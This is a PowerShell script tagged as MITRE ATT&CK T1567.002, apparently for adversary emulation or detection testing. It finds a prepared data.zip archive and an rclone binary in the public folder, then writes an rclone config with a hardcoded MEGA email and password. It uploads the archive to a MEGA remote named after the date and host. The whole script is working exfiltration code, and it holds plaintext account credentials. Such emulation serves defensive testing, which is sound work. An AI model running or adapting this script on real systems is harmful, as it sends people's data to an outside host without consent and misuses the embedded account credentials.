# Exfiltrate to MEGA.NZ
# Technic ID : T1567.002
Clear-Host
Write-Output "==============================================================================="
Write-Output "Exfiltratrion to MEGA.NZ: "
Write-Output "Exfiltration to Cloud Storage (T1567.002)"
Write-Output "==============================================================================="
#
$Slash = "/"; 
$AntiSlash = "\"; 
$Column = ":";
$LogFile = "$env:PUBLIC\exf\mega_exfiltration.txt";
$Username = "dagive1680@emailkeep.com";
$Password = "qQCxCqrEeXDyPN8zWh3p";
$Cloud_Storage = "mega"; 
$ArchiveName = "data.zip";
$ToolsDir = "$env:PUBLIC\toolz\"
$TransferBinary = $ToolsDir+"rclone.exe"
$LocalStorageDir = "$env:PUBLIC\exf";

$FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
Get-Date | Out-File -FilePath "$LogFile" -Encoding utf8 -Force;
if ([System.IO.File]::Exists("$FullPathArchive")) 
{
    Write-Output "Successfully found [$FullPathArchive]" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append; 
    if ([System.IO.File]::Exists("$TransferBinary"))    
        {
        Write-Output "Successfully found [$TransferBinary]" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
#        New-Item $ToolsDir+$AntiSlash+"rclone" -ItemType directory;
#        New-Item $ToolsDirl+$AntiSlash+"rclone\rclone.conf";
        $LaunchDate = `Get-Date -Format "yyyMMdd_HHmmss";
        $HostName   = $env:COMPUTERNAME;
        $MegaShareDir = $LaunchDate+"_"+$HostName;
        cd $ToolsDir
        .\rclone.exe config create $MegaShareDir mega --config $ToolsDir"rclone.conf"
        set-Content $ToolsDir"rclone.conf" "[$MegaShareDir] `n type = mega `n user = $Username `n pass = $Password"
        .\rclone.exe copyto "$FullPathArchive" $MegaShareDir:files -vvvv | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
        exit 0;
        }
    else 
        { 
        "The file $TransferBinary does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
        exit 2;
        };
}
else 
{ 
    "The file $FullPathArchive does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
    exit 1;
};